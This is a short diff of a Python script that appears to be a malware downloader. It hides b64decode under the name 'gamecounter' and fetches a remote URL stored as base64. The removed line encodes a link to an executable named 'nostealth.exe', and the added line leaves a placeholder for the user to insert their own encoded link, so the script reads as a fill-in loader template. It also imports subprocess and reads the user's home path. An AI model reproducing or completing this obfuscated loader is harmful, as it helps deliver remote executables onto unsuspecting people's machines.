@@ -3,7 +3,7 @@ from base64 import b64decode as gamecounter
 import os 
 import subprocess
 
-asset = 'aHR0cHM6Ly9jZG4uZ2xpdGNoLmdsb2JhbC8zOTc1NGVjOC1iMzQ0LTQ2NmYtYjJhMS1jYmRkYjVkMTY0ZTcvbm9zdGVhbHRoLmV4ZT92PTE2OTc1Njc3NDk4MzQ=='
+asset = 'INSERT BASE64 ENCODED LINK HERE'
 response = r.get(gamecounter(asset).decode('utf-8'))
 username = os.path.expanduser('~')
 
